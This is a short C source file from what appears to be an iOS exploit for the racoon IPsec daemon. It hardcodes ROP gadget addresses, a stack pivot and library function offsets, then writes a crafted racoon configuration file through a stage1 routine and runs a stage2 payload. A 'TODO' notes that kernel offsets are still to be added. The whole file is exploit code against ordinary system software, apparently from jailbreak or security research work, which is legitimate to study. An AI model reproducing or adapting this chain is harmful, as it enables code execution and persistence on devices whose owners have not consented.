#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include "common.h"
#include "stage1.h"
#include "stage2.h"

int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
	offset_struct_t myoffsets;
	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
	myoffsets.lcconf_counter_offset = 0x10c;
	myoffsets.memmove = 0x1aa0b8bb8;
	myoffsets.longjmp = 0x180a817dc;
	myoffsets.stack_pivot = 0x180a81808;	
	myoffsets.mmap = 0x180978c50;
	myoffsets.open = 0x1809779ac;
	myoffsets.max_slide = 0x66dc000;
	myoffsets.slide_value = 0x4000;
	myoffsets.pivot_x21 = 0x1990198fc;
	myoffsets.str_buff_offset = 8;
	myoffsets.BEAST_GADGET = 0x1a0478c70;
	myoffsets.BEAST_GADGET_LOADER = 0x1a0478c94;
	myoffsets.BEAST_GADGET_CALL_ONLY = 0x1a0478c90;
	myoffsets.str_x0_gadget = 0x198ba668c;
	myoffsets.str_x0_gadget_offset = 0x28;
	myoffsets.cbz_x0_gadget = 0x00349c54;
	myoffsets.cbz_x0_x16_load = 0x17f60d30;
	myoffsets.add_x0_gadget = 0x184f6992c;
	myoffsets.rop_nop = 0x180a8181c;
	myoffsets.new_cache_addr = 0x1c0000000;
	myoffsets.cache_text_seg_size = 0x30000000;
	myoffsets.stage2_base = myoffsets.new_cache_addr+myoffsets.cache_text_seg_size+0x4000;
	myoffsets.stage2_size = 0x1000;
	myoffsets.stage2_max_size = 0x100000;
	// TODO: add kernel offsets


	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
	stage1(f,&myoffsets);
	close(f);

	stage2(&myoffsets,"/private/etc/racoon/");

	return 0;
}
